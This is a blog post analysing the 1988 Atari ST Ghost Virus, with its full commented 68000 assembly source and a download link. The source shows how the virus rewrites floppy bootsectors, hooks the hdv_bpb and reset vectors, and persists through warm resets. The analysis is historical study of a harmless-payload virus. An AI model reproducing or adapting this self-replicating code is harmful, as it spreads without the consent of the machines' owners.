Title: The infamous Ghost Virus
Slug: infamousGhostVirus
Date: 2024-08-17 07:13
Modified: 2024-08-18 22:44
Location: Stockholm / Sweden
Category: Atari ST, Virus
Lang: en
Author: shazz
Summary: How the Ghost Virus infested every Atari ST on the planet...


## Introduction

To start this journey in the world of Atari ST viruses, I decided to reverse engineered probably the most well known ST virus, it spread like cold in the winter, everybody had floppies infected. And I must admit, the first times I "caught" it, I did not even notice it was a virus, I thought it was an OS bug and I learnt to live with it! A little like the flu, the Ghost Virus was not lethal, maybe coded as a joke, we'll probably never know. Its symptoms where simple, after 10 replications, the vertical mouse direction was inverted. And "fixed" after 5 new replications, and so on.
So basically, it was like using your mouse like in typical flight simulators, go up... to go down.
Yeah... like the flu, a little bothering but nothing that bad :)

It looks like it appeared in 1988, some people claim it originated from England from somebody called Pash. But I was not able to find any link or proofs of that. Internet did not really exist at this time. That would be awesome to find its creator and know more but.... that's a long time ago now.

## High level specs

Anyway, to summarize and before going into the details, here are the main characteristics of the Ghost Virus:

 - **executable bootsector** virus
 - memory resident using the official **reset vector**
 - **stealth execution at boot** using an undocumented technique
 - replaces the original **HDV_BPB vector** to be activated on any floppy (A or B) reads
 - copies itself over **unused User Vectors** RAM space
 - activates symptoms after 10 copies then switched OFF/ON every 5 copies


## The details

Finding the virus is straight forward, I'm sure I still have some infected disks and it was so wide-spread that some magazine disks or game compilations are still propragating it :) But, I was lazy, I simply extracted it from antivirus databases (which were not encrypted at all in most cases).

Then I disassembling it using Eazy Rider on [Hatari](http://hatari.tuxfamily.org/) and checked with my preferred hex tools: [ImHex](https://imhex.werwolv.net/) which has a pretty good multi CPU disassembler.

I reformatted and commented the code, line by line, to be sure I understood all the magic.

I also hacked a simple sandbox testing tool to be sure my "cleaned" version was still working as expected, so basically a TOS program to load the virus in memory, as the TOS boot loader is doing (if you're curious, check the [TOS disassembly code](https://github.com/th-otto/tos1x/blob/master/bios/startup.S)). I will do another post later on this testing tool.

#### Setting some constants for readability

Let's start with some constants, they will be useful later on.

```asm
; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
PHYSTOP                 equ $42E
RESVEC_ENA              equ $426
RESVEC                  equ $42A
RESVEC_MAGIC            equ $31415926
RESIDENT_MAGIC          equ $12123456
RESIDENT_CHK            equ $5678
HDV_BPB                 equ $472
BOOT_CHK                equ $1234
PAGE_SIZE               equ 512

; xbios
XBIOS                   equ 14
KBDVBASE                equ $22
FLOPRD                  equ 8
FLOPWR                  equ 9
MOUSEVEC_OFFSET         equ 16

; variables
COUNTER_DEFAULT         equ $FFFFFFFB

; RAM locations
BOOTSECT_BUF            equ $4C6
RAM_ADDR                equ $140

; Relative addresses after copy to RAM_ADDR
RESET_VECTOR_ADDR       equ RAM_ADDR + (RESET_VECTOR - LOADER)
HDV_HPB_JMP_ADDR        equ RESET_VECTOR_ADDR + (HDV_HPB_ORIGINAL_VECTOR - RESET_VECTOR) + 2
COUNTER_ADDR            equ RESET_VECTOR_ADDR + (COUNTER - RESET_VECTOR)
INITMOUS_PARAMS_ADDR    equ RESET_VECTOR_ADDR + (INITMOUS_PARAMS - RESET_VECTOR)
HDV_HPB_VECTOR_ADDR     equ RESET_VECTOR_ADDR + (HDV_HPB_VECTOR - RESET_VECTOR)
RESET_VECTOR_PAGE       equ PAGE_SIZE*64
RESET_VECTOR_SUBPAGE    equ PAGE_SIZE*1
```

What to note at this point, the virus is using some XBIOS functions, the reset vector and the HDV_HPB vector. But we'll dig into that later.

#### The Loader

Then, the bootsector code starts with what I call the `Loader` part, dedicated to set the official reset vector to be "reset-proof" then copy itself in the ST memory at a "stealh" location, into the unused user vectors space (ST only) from `0x140` to `0x380`, so 576 bytes available, more than the bootsector itself. Please refer to this post to check the [ST memory map](/the-atari-stttfalcon-memory-map-en.html)


Let's see the details:

```asm
; ----------------------------------------------------------------------------------------------------------
; Loader
; ----------------------------------------------------------------------------------------------------------
LOADER:
            MOVE.L    #$D6,D3 				            ; D3 = 214
            LEA       RAM_ADDR.W,A1 		            ; A1 @ 320 (0x140) => 1st USER DEFINED VECTOR
            LEA       LOADER(PC),A2			            ; A2 @ LOADER
            MOVE.L    (A2),D2 				            ; STOP IF L001 IS IN 0x140
            CMP.L     (A1),D2
            BEQ       LOADER_END
            MOVE.L    #RESVEC_MAGIC,D0 		            ; ELSE D0 = 0x31415926
            CLR.L     D1					            ; D1 - 0
            CMP.L     RESVEC_ENA.W,D0 			        ; IF @ 0x426 != 0x31415926 = >If this location contains the magic number $31415926
                                                        ; then the system will jump through resvector (42A) on a system reset
            BNE       PASS_RESVEC 			            ; GOTO PASS_RESVEC
            MOVE.L    RESVEC.W,D1 				        ; ELSE D1 = 0x42A
PASS_RESVEC:
            LEA       ORIGINAL_RESET_VECTOR(PC),A0      ; A0 = payload start address (ORIGINAL_RESET_VECTOR)
            MOVE.L    D1,(A0) 				            ; D1 = resvector address copied to empty space in ORIGINAL_RESET_VECTOR
            MOVE.L    #RESET_VECTOR_ADDR,D2				; set relocated RESET_VECTOR address in D2 to be the reset vector address
            MOVE.L    D2,RESVEC.W 				        ; resvector: If the magic number in resvalid is set properly, this vector will be
                                                        ; jumped through on a system reset with the return address placed in A6.
            MOVE.L    D0,RESVEC_ENA.W 		            ; set magic value
COPY_LOADER:
            MOVE.W    (A2)+,(A1)+ 			            ; FOR i = 214 TO 0 (214 words so 428 bytes)
            DBF       D3,COPY_LOADER		            ; COPY THIS PROGRAM A2+ (LOADER)+ to A1+ ($140)+
            MOVE.L    #COUNTER_DEFAULT,COUNTER_ADDR.W   ; reset counter to -10
            BSR.S     INSTALL_HDV_HPB
LOADER_END: RTS
```

What to notice:

 1. The loader checks if it is already copied at the target location (`0x140`), meaning the first byte is the same. If this is the case, it just do nothing more (`LOADER_END`)
 1. The Loader will also check the magic value, `0x31415926`, is set in the resvec register (`0x426`). If not, it will setup the reset vector:
    1. Set the reset vector routine address `RESET_VECTOR` (`0x194`) in `RESVEC` (`0x42A`)
    1. Set the magic value `0x31415926` to `RESVEC_ENA` (`0x426`)
    1. Copy itself (428 bytes, more than needed) to `RAM_ADDR` (`0x140`). Not that this will relocate the `RESET_VECTOR` part at `0x194` as expected.
    1. It will reset the replication counter `COUNTER_ADDR` to the default value: `0xFFFFFFFB` which means -5 after owverflow
    1. Finally it will branch to the `INSTALL_HDV_HPB` sub routine

Note: for the first pass, when the bootsector is executed from his temporary location (at `DSKBUFP` address). If I'm not wrong:
 - the `LOADER` copied in `0x140` is never banched and executed, it is used as storage to be copied on the bootsector at each replication or to reset the `HDV_HPB` vector at reset.
 - if the `LOADER` is called again, it will check his presence at `Ox140` and exit if there.
 - The `LOADER` copy is stored below the `0x800` mark and so will not be deleted after a warm reset.

#### The HDV_NPB setup

Last setup, the loader installs the routine overloading the `HDV_HPB` vector, used when `Getbpb()` is called by any aplication or the GEM.
This routine is setup by the `LOADER` at first execution of the boot sector then recopied from the storage locaion to a stealh location in the upper RAM, then called after every warm reset.


```asm
; ----------------------------------------------------------------------------------------------------------
; Install HDV_HPB Vector Replacement
; ----------------------------------------------------------------------------------------------------------
INSTALL_HDV_HPB:
            ifne _DEBUG_
            ADDQ.B    #1,4+DEBUG_ADDR.W
            endc
            MOVE.L    #RESVEC_MAGIC,RESVEC_ENA.W        ; set magic value
            MOVE.L    HDV_BPB.W,D0 				        ; hdv_bpb: This vector is used when Getbpb() is called.
                                                        ; A value of 0 indicates that no hard disk is attached.
                                                        ; Applications installing themselves here should expect
                                                        ; parameters to be located on the stack as they would be
                                                        ; for the actual function call beginning at 4(sp).
                                                        ; If the installed process services the call it should RTS,
                                                        ; otherwise, leaving the stack intact, should JMP through the old vector value
            LEA       HDV_HPB_JMP_ADDR.W,A0             ; value of 0x2E0 JUMP address
            MOVE.L    D0,(A0)                           ; set original jum vector return to JMP
            LEA       HDV_HPB_VECTOR_ADDR.W,A0          ;
            MOVE.L    A0,HDV_BPB.W                      ; set vector to 0x20E (HDV_HPB_VECTOR)

            RTS
```

In detals:

 1. It sets the magic value `RESVEC_MAGIC`in `RESVEC_ENA` (`0x426`) to enable the reset vector
 1. It gets the default `hdv_bpb` vector address and stores it in `HDV_HPB_JMP_ADDR`
 1. It replaces the `hdv_bpb` vector address by `HDV_HPB_VECTOR`


#### The new hdv_bpb vector

As set in `HDV_BPB` here is the new hdv_bpb vector which is the heart of the virus. As mentionned before it is excecuted each time the BIOS function `Getbpb()`. In short:

```
BPB *Getbpb( dev )
WORD dev;
Getbpb() returns the address of the current BPB (Bios Parameter Block) for a mounted device.

- OPCODE: 7 (0x07)
- AVAILABILITY: All TOS versions.
- PARAMETERS: dev specifies the mounted device (‘A:’ = 0, ‘B:’ = 1) .
- BINDING
    move.w dev,-(sp)
    move.w #$07,-(sp)
    trap #13
    addq.l #4,sp
    Getmpb() – 3.31
- RETURN VALUE:  Getbpb() returns a pointer to the device’s BPB. The BPB is defined as follows:
    typedef struct
    {
        WORD recsiz; /* bytes per sector */
        WORD clsiz; /* sectors per cluster */
        WORD clsizb; /* bytes per cluster */
        WORD rdlen; /* sector length of root directory */
        WORD fsiz; /* sectors per FAT */
        WORD fatrec; /* starting sector of second FAT */
        WORD datrec; /* starting sector of data */
        WORD numcl; /* clusters per disk */
        WORD bflags; /* bit 0=1 - 16 bit FAT, else 12 bit */
    } BPB
```

So each time an application or the GEM needs to read the disk information, this function is called... and so the virus routine.
The code is detailed but in brief, here is what happens, the routine reads and buffers the bootsector, copy the `LOADER` on top of it, patches it to make it executable and writes it back.

Each time it happens, a counter is incremented. And if the counter reaches 5 (starting from -5 the first time), the routine will retrieve the `mousevec` vector and then will use it to call the `initmouse` XBIOS function which has an option to inverse the mouse vertical axis.

```asm
; ----------------------------------------------------------------------------------------------------------
; HDV_HPB Vector Replacement - Core virus code
; ----------------------------------------------------------------------------------------------------------
HDV_HPB_VECTOR:
            MOVE.W    4(sp),D0                          ; hdv_bpb vector
            CMP.W     #2,D0                             ; if dev is not A or B (>=2), do to original vector
            BGE       HDV_HPB_ORIGINAL_VECTOR           ; else
            MOVEM.L   A0-sp/D7/D1-D5,-(sp)              ; duplicate bootloader
            MOVE.W    D0,D7                             ; D7 contains A or B (0 or 1)
            MOVE.L    #(0 << 16 | 1),-(sp)              ; count: 1 | side: 0
            MOVE.L    #(1 << 16 | 0),-(sp)              ; track: 0 | sector: 1
            MOVE.W    D7,-(sp)                          ; dev, D7 contains A or B (0 or 1)
            CLR.L     -(sp)                             ; rsrvd => 0
            LEA       BOOTSECT_BUF.W,A5
            MOVEA.L   (A5),A5                           ;
            MOVEA.L   A5,A6                             ;
            MOVE.L    A5,-(sp)                          ; buf = (BOOTSECT_BUF)
            MOVE.W    #FLOPRD,-(sp) 	                ; FLOPRD
            TRAP      #XBIOS
            ADDA.L    #$14,sp                           ; fix stack
            TST.W     D0                                ; 0 = success
            BMI       HDV_HPB_VECTOR_END                ; else quit
PATCH_BOOT:
            MOVE.W    #$601C,(A5)                       ; patch read bootloader buffer with BRA
            ADDA.L    #$1E,A5                           ; advance buffer to bootloader start ($1E)
            LEA       LOADER(PC),A4                     ; A4 = start bootsector program
            LEA       PROG_END(PC),A3                   ; A3 = end
COPY_LOADER_2:
            MOVE.W    (A4)+,(A5)+                       ; copy virus prg
            CMPA.L    A3,A4
            BLT.S     COPY_LOADER_2
            MOVEA.L   A6,A5
            MOVE.W    #$FE,D1                           ; D1 = 254 bytes
            MOVE.W    #BOOT_CHK,D0                      ; CHK bootsector value
CALC_BOOT_CHK:
            SUB.W     (A5)+,D0
            DBF       D1,CALC_BOOT_CHK
            MOVE.W    D0,(A5)                           ; add remainder to make bootsector executable

            MOVE.L    #(0 << 16 | 1),-(sp)              ; count: 1 | side: 0
            MOVE.L    #(1 << 16 | 0),-(sp)              ; track: 0 | sector: 1
            MOVE.W    D7,-(sp)                          ; dev, D7 contains A or B (0 or 1)
            CLR.L     -(sp)                             ; rsrvd = 0
            MOVE.L    A6,-(sp)                          ; buf = (BOOTSECT_BUF)
            MOVE.W    #FLOPWR,-(sp) 	                ; FLOPWR
            TRAP      #XBIOS
            ADDA.L    #$14,sp                           ; fix stack
            TST.W     D0                                ; success if 0
            BMI       HDV_HPB_VECTOR_END                ; else quit
            ADDI.L    #1,COUNTER_ADDR.W                 ; add replication counter of 1
            CMPI.L    #5,COUNTER_ADDR.W                 ; if not 5 quit (starting fron 251, meaning 10 iterations
                                                        ; then reset to 0 so 5 to 5)
            BNE       HDV_HPB_VECTOR_END
            CLR.L     COUNTER_ADDR.W                    ; else set mousevec
            MOVE.W    #KBDVBASE,-(sp) 	                ; Kbdvbase() returns a pointer to a system structure containing
                                                        ; a ‘jump’ table to system vector handlers.
            TRAP      #XBIOS
            ADDQ.L    #2,sp                             ; fix stack, midivec, vkbderr, vmiderr , statvec, mousevec, clockvec, joyvec pointers struct in set in D0
            ADD.L     #MOUSEVEC_OFFSET,D0               ; D0+16 => mousevec
            EXG       A0,D0                             ; A0 = mousevec address

            MOVE.L    (A0),-(sp) ;4                     ; add mousev vector to stack
            PEA       INITMOUS_PARAMS(PC)  ;4           ; push INITMOUS_PARAMS content: 0x01 | 0x01 | 0x01 | 0x01
                                                        ; param 0 = 1 : y origin at top, this will inverse
                                                        ; param 1 = 1 : buttons events as mouse packets
                                                        ; param 2 = 1 : x theshold increment of 1
                                                        ; param 3 = 1 : y threshold increment of 1
            MOVE.L    #1,-(sp)   ;4                     ; 0 | 1 : opcode 0 initmouse, mode 1: mouse in relative
            TRAP      #XBIOS                            ; XBIOS initmouse(mode, params, vector)
            ADDA.L    #$C,sp     ;12                    ; fix stack

            EORI.B    #1,INITMOUS_PARAMS_ADDR.W         ; Invert INITMOUS_PARAMS_ADDR[0] = y origin to 1 to let people think this is done :D
HDV_HPB_VECTOR_END:   MOVEM.L   (sp)+,A0-A6/D1-D7

HDV_HPB_ORIGINAL_VECTOR:
            JMP       $00FC0FCA                         ; will be patched to contain hdv_bpb original vector address

INITMOUS_PARAMS:
            DC.B      $01                               ; y origin at top
            DC.B      $01                               ; buttons events
            DC.B      $01                               ; x threshold
            DC.B      $01                               ; y threshold

COUNTER:
            DC.L      COUNTER_DEFAULT                   ; replication counter, initialized at -5

END:        DC.B      $00,$00

PROG_END:   DCB.W        24,0
            DC.B      'J',$97

    END
```

In details, this routine:

 1. Retrieves the 1st `Getbpb()` parameter from the stack: dev (0 for A, 1 for B, ...)
 1. If A or B (meaning this is a floppy), reads the bootsector using XBIOS `FLOPRD` and stores it in a buffer (`BOOTSECT_BUF`), which is also where the TOS copies bootsector when read.
 1. Patches the buffer adding the classic `0x601C` BRA instruction to branch to the bootsector code.
 1. Copies the `LOADER` into the buffer at `0x1E` location.
 1. Computes the checksum and sets the last word to be equals to `0x1234` required to make the bootsector executable.
 1. Writes back the buffer to the bootsector using XBIOS `FLOPWR`.
 1. Increments the counter `COUNTER_ADDR` (initilialized at -5).
 1. If `COUNTER_ADDR` equals to 5:
    1. Uses XBIOS `KBDVBASE` call to retrieve keyboard, midi... and especially the mousevec vector (located at `MOUSEVEC_OFFSET` in the returned structure)
    1. Calls XBIOS `initmouse(mode, params, mouse vector)` while setting the first param, y origin at top, to 1 to invert the Y axis
    1. Patches the params data with a XOR to reset the y origin to 0 and removes the virus effect... for 5 copies!

#### The Reset Vector

The Reset Vector, installed by the `LOADER`, will use an undocumented TOS feature which allow a routine to be run after reset, before the RAM is flushed, if a magic value is set at some predefined locations and if the routine checksum is equals to `0x5678` (you'll appreciate the symetry with the bootsector checksum: `0x1234`).

```asm
; ----------------------------------------------------------------------------------------------------------
; Reset vector flag and routine
; ----------------------------------------------------------------------------------------------------------
ORIGINAL_RESET_VECTOR:
            DCB.W     2,0 					            ; $190: resvector address will be written here

; Concerning cold and warm reset. For every virus coder it is very important to know what's going on at reset
; sequence  esspecially concerning memory locations and system; vectors.
; In generally: in both reset cases memory is zeroed from (phystop - $200) to $800.
; Just before that, TOS searches memory in steps of two memory pages (512 bytes) in "hope" to find a
; following contents: longword $12123456 and a longword of actual double memory page.
; Note, as said, that if this code is the zeroed range, it will be exectuted THEN erased.

RESET_VECTOR:                                           ; $194
            MOVEA.L   PHYSTOP.W,A1 				        ; Set A1 to phystop (end of mem), $80000/524288 on 520ST
                                                        ; ghost looks to install itself at a required $200 boundary page
                                                        ; at page 40 ($8000) - 1 ($200)
            SUBA.L    #RESET_VECTOR_PAGE,A1
            SUBA.L    #RESET_VECTOR_SUBPAGE,A1          ; decrease a memory page (512 bytes)

            MOVE.L    A1,D1                             ; Save location address (needed to TOS)
            ifne _DEBUG_
            MOVE.L    D1,DEBUG_ADDR.W
            endc

            MOVE.L    #RESIDENT_MAGIC,(A1)+             ; Add magic word 0x12123456 that TOS looks for
            MOVE.L    D1,(A1)+                          ; then actual memory address of the magic work

                                                        ; In successful case, TOS first does a wrd
                                                        ; checksum, which has to be $5678. If that  is correct, the code on
                                                        ; that  double  memory  page  is  executed  through JSR with return
                                                        ; address in A6.

            LEA       INSTALL_HDV_HPB(PC),A3            ; A3 = INSTALL_HDV_HPB vector routine
            LEA       HDV_HPB_VECTOR(PC),A4             ; A3 = HDV_HPB_VECTOR copy routine
COPY_INSTALL_HDV_HPB:
            MOVE.W    (A3)+,(A1)+                       ; copy INSTALL_HDV_HPB vector routine after magic word / address
            CMPA.L    A4,A3                             ; until copy routine address in reached
            BLT.S     COPY_INSTALL_HDV_HPB

            LEA       LOADER(PC),A3                     ; A3 = bootloader start
            MOVE.L    A3,(A1)+                          ; then set it at the end (why? after RTS?)

            MOVEA.L   D1,A3                             ; Reset A3 to ram top location
            CLR.W     D0                                ; clear d0 to store checksum
            MOVE.W    #$FE,D2                           ; D2 = 254 words (2 pages)
CALC_RESIDENT_CHK:
            ADD.W     (A3)+,D0                          ; Compute checksum
            DBF       D2,CALC_RESIDENT_CHK              ;
            MOVE.W    #RESIDENT_CHK,D2                  ; then substract $5678 to adjust the checksum
            SUB.W     D0,D2                             ;
            MOVE.W    D2,(A3)                           ; copy this value to the end of the virus

            MOVE.L    #0,RESVEC_ENA.W                   ; remove magic value to resvector
            MOVEA.L   ORIGINAL_RESET_VECTOR(PC),A1      ; get reset vector address in a1
            CMPA.L    #0,A1                             ; check reset vector address is empty
            BNE       RESET_VECTOR_SET                  ; if not jump to reset vector address
            JMP       (A6)                              ; else jump to original resetvec return address
RESET_VECTOR_SET:
            JMP       (A1)
```

So in order, the reset vector routine:

 1. Set a specific target address: end of ST RAM (`PHYSTOP` (`0x42E`) depends on model 520, 1040..., for example that's `0x80000` on a 520, `0x100000` on a 1040), then minus `0x8000` and minus `0x200` (basically 32KB + 512 bytes before the end of the available memory)
    1. It has to be on a `0x200` (512) bytes boundary
    1. It is better to be near the end of the memory to limit chances to be overlapped and erased after reset
    1. You'll notice the memory substraction in done in 2 steps and not a "simple" `SUBA.L #$8200,A1`. Why? It looks to be linked to 68K SUBA opcode which considered the offset as signed as $8000 is half a word. I need to investigate what the assember generates for the size specification:

```
Object Code:  1001 ddds 11 ff ffff
              9... .... .. .. ....
                where: ddd is the destination address register
                s is the size specification
                0 = the source is a sign extended word
                1 = the source is a long word
                ffffff is the effective address field
```

 1. Then, as not documented :) at this special location the magic number `RESIDENT_MAGIC` (`0x12123456`) as long should be written
 1. And in the next long, the value of this specific location, so in this case `PHYSTOP` - `0x8200`
 1. After this kind of "header", the reset vector copies the `INSTALL_HDV_HPB` routine, the "replicator", word by word.
 1. I also copied, at the end, the `INSTALL_HDV_HPB` address but I don't know why (yet?)
 1. Finally it has to compute the checksum of this resident routine, starting from the location address in the header up to 2 pages (255 words - last word) and fix it to be equals to `RESIDENT_CHK` (`0x5678`) and stores it in the last word.
 1. It disables the reset vector as the resident routine is installed
 1. Jump to the `ORIGINAL_RESET_VECTOR` address if set, which should contains the resvector address, else the original vector address

What is important to understand, and took me some time and debug:
 - After a warm reset, the official reset vector copies the `INSTALL_HDV_HPB` at the stealh location amd set the magic header
 - This is only task of the eset vector then it deactivates until `INSTALL_HDV_HPB` sets it again.
 - Then the TOS looks along the RAM to check if this magic header exists at `0x200` boundaries and if found execute the routine
 - The `INSTALL_HDV_HPB` is then executed to be sure the `hdv_bpb` vector responsible to replicate the virus is set
 - The TOS then flushes the memory (from $800 to near `PHYSTOP`), leaving the `LOADER` intact but deleting the `INSTALL_HDV_HPB` copied routine

## Timeline

I drawed a kind of timeline, trying to show the various steps and where the relocatable virus code is copied and executed.

<a href="{attach}images/ghost_timeline.png" target="_blank"><img src="{attach}images/ghost_timeline.png" width="400"></a>

## Conclusion

I start to think this is why this virus was called the **Ghost Virus**, and not the mouse inversion virus (or any name linked to the symptoms), as the magic is really in this transient routine automatically called then deleted, leaving no trace of its execution but making sure the replication vector (`hdv_bpb`) is still alive.

If technically, it think this is pretty impressive for 1988, it doesn't let much space for the symptoms themselves and even if using the "ghost" code to setup the `hdv_bpb` vector after a warm reset is pretty cool (and took me some time and debug to understand), I wonder what it would change to simply setup the `hdv_bpb` vector fron the `resvector` reset vector directly, as without `resvector`, the *ghost code* cannot be rewritten after each reset.

You can download the full commented (and tested identical to the original virus after assembling with [vasm](http://www.compilers.de/vasm.html)) here: [GHOST.S]({attach}sources/GHOST.S)

## Appendices

### Fun facts

In the source code of one of my preferred demo, Mindbomb from The Lost Boys, there are 2 [commented disassemblies](https://github.com/ggnkua/Atari_ST_Sources/tree/master/ASM/The%20Lost%20Boys%20(TLB)/Mindbomb/Vector) of the Ghost virus in the same folder as the reset demo screen (Vector) so maybe written by Mainikin? I was pleased to see that he was not able to undertand some parts of the virus that took me some time to figure out, especially the mouse inversion part which causes most disassemblers to misinterpret the XBIOS call:

```asm
    CLR.L	(A0)			WAIT FOR 5 MORE TIMES
    MOVE.W	#$22,-(A7)		GET ADDRESS OF MOUSE VEC
    TRAP	#14
    ADDQ.L	#2,A7
    ADD.L	#$10,D0			NOT SURE HOW IT MAKES MOUSE GO!
    EXG	D0,A0
    MOVE.L	(A0),-(A7)
    PEA	L2110A(PC)
    MOVE.L	#1,-(A7)       <========
    TRAP	#14
    ADDA.L	#$C,A7
    LEA 	SHIT(PC),A0
    EORI.B	#1,$(A0)
```

As `MOVE.L	#1,-(A7)` should not be considered as a call to `ssbrk()` (opcode 1) but `initmouse()` (opcode 0). 
And no comment about the undocumented TOS feature, I guess few people were aware.

Another English demoscener tried to also to [do the job](https://github.com/ggnkua/Atari_ST_Sources/blob/master/ASM/The%20Cenobytes/fink/B_SECTOR/GHOST_V.S) (I must admit I don't know him), The Fink from The Cenobytes but without better success:

```asm
    ADD.L	#$10,D0		GET ORIGIN FOR Y-AXIS IS UP
    EXG	A0,D0		    EXCHANGE REGISTERS A0 WITH D0 
                        (FUCK THE MOUSE UP!!!!!!)
    MOVE.L	(A0),-(A7)
    PEA	$1C4(PC)	    RESERVE 452 BYTES AT UPPER END OF MEMORY
    MOVE.L	#1,-(A7)
    TRAP	#14		    SAVE MEMORY SPACE
    ADDA.L	#$C,A7
    
    EORI.B	#1,$2E6.W
```

### System calls (From the Atari Compendium)

#### XBIOS Floprd

```
Floprd()
WORD Floprd( buf, rsrvd, dev, sector, track, side, count )

Parameters:
- VOIDP buf;
- LONG rsrvd;
- WORD dev, sector, track, side, count;

Floprd() reads sectors from a floppy disk.

- OPCODE: 8 (0x08)
- AVAILABILITY: All TOS versions.
- PARAMETERS: buf points to a word-aligned buffer where the data to be read will be stored. rsrvd is currently unused and should be 0. dev specifies the floppy drive to read from (‘A:’ = FLOP_DRIVEA (0), ‘B:’ = FLOP_DRIVEB (1)). The function reads count physical sectors starting at sector sector, track track, side side.
- BINDING: 
    move.w count,-(sp)
    move.w side,-(sp)
    move.w track,-(sp)
    move.w sector,-(sp)
    move.w dev,-(sp)
    move.l rsrvd,-(sp)
    pea buf
    move.w #$08,-(sp)
    trap #14
    lea 20(sp),sp
- RETURN VALUE: Floprd() returns 0 if the operation was successful or non-zero otherwise.
- CAVEATS This function reads sectors in physical order (not taking interleave into account). Use Rwabs() to read logical sectors.
```

#### XBIOS Flopwr

```
Flopwr()
WORD Flopwr( buf, rsrvd, dev, sector, track, side, count )

Parameters:
- VOIDP buf;
- LONG rsrvd;
- WORD dev, sector, track, side, count;

Flopwr() writes sectors to the floppy drive.

- OPCODE: 9 (0x09)
- AVAILABILITY All TOS versions.
- PARAMETERS buf is a pointer containing data to write. rsrvd is currently unused and should be set to 0. dev specifies the floppy drive to write to (‘A:’ = 0,’B:’ = 1). This function writes count sectors starting at sector sector, track track, side side.
- BINDING:
    move.w count,-(sp)
    move.w side,-(sp)
    move.w track,-(sp)
    move.w sector,-(sp)
    move.w dev,-(sp)
    move.l rsrvd,-(sp)
    pea buf
    move.w #$09,-(sp)
    trap #14
    lea 20(sp),sp
- RETURN VALUE Flopwr() returns 0 if the sectors were successfully written or non-zero otherwise.
- CAVEATS This function writes sectors in physical order only (ignoring interleave). Use Rwabs() to write sectors in logical order
```
